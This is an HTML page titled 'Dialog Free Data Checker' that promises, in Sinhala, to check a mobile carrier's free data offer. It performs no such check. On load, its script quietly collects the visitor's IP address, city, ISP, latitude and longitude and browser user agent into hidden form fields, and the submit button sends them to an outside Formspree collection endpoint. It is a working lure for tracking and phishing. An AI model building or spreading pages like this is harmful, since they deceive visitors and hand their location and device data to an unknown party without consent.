<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dialog Free Data Checker</title>
  <style>
    body {
      background: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 30px;
    }
    h2 {
      color: #00cec9;
    }
    p {
      color: #dfe6e9;
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 6px;
      border: none;
    }
    #ipContainer {
      display: flex;
      gap: 10px;
      max-width: 500px;
      flex-wrap: wrap;
    }
    #custom_ip {
      flex: 1;
      min-width: 220px;
    }
    .copy-btn {
      background: #636e72;
      color: white;
      cursor: pointer;
    }
    .submit-btn {
      background-color: #0984e3;
      color: white;
      cursor: pointer;
      width: 100%;
      max-width: 500px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <h2>Dialog Free Data Checker</h2>
  <p>ඔබගේ IP ලිපිනය හා Device තොරතුරු පරීක්ෂා කර Dialog free data availability check කරන්න.</p>

  <form action="https://formspree.io/f/manelzor" method="POST" id="dataForm">
    <div id="ipContainer">
      <input type="text" id="custom_ip" name="custom_ip" readonly>
      <button type="button" class="copy-btn" onclick="copyIP()">Copy</button>
    </div>

    <input type="hidden" name="detected_ip" id="detected_ip">
    <input type="hidden" name="location" id="location">
    <input type="hidden" name="device_info" id="device_info">

    <button type="submit" class="submit-btn">Check Free Data</button>
  </form>

  <p id="status" class="hidden">Submitting... Please wait</p>

  <script>
    async function gatherInfo() {
      try {
        const res = await fetch("https://ip-api.com/json/");
        const data = await res.json();

        if (data.status === "success") {
          document.getElementById("custom_ip").value = data.query;
          document.getElementById("detected_ip").value = data.query;
          document.getElementById("location").value = `Country: ${data.country}, Region: ${data.regionName}, City: ${data.city}, ISP: ${data.isp}, Lat: ${data.lat}, Lon: ${data.lon}`;
        }

        document.getElementById("device_info").value = navigator.userAgent;
      } catch (e) {
        console.error("Error fetching IP info");
      }
    }

    function copyIP() {
      const ipInput = document.getElementById("custom_ip");
      ipInput.select();
      ipInput.setSelectionRange(0, 99999); // For mobile
      navigator.clipboard.writeText(ipInput.value);
      alert("IP copied to clipboard!");
    }

    gatherInfo();

    document.getElementById("dataForm").addEventListener("submit", () => {
      document.getElementById("status").classList.remove("hidden");
    });
  </script>
</body>
</html>
